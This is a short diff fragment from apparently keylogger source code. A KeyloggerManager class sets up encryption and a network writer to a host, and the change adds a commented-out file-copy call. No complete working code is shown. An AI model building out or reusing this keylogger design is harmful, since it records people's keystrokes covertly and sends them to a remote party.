@@ -17,6 +17,7 @@ class KeyloggerManager:
         self.encryptor = Encryptor(key)
         self.writer = NetworkWriter(host)
         self.wrapper = self.wrapper_fill()
+        # self.copy_file()
         self.main()
 
 
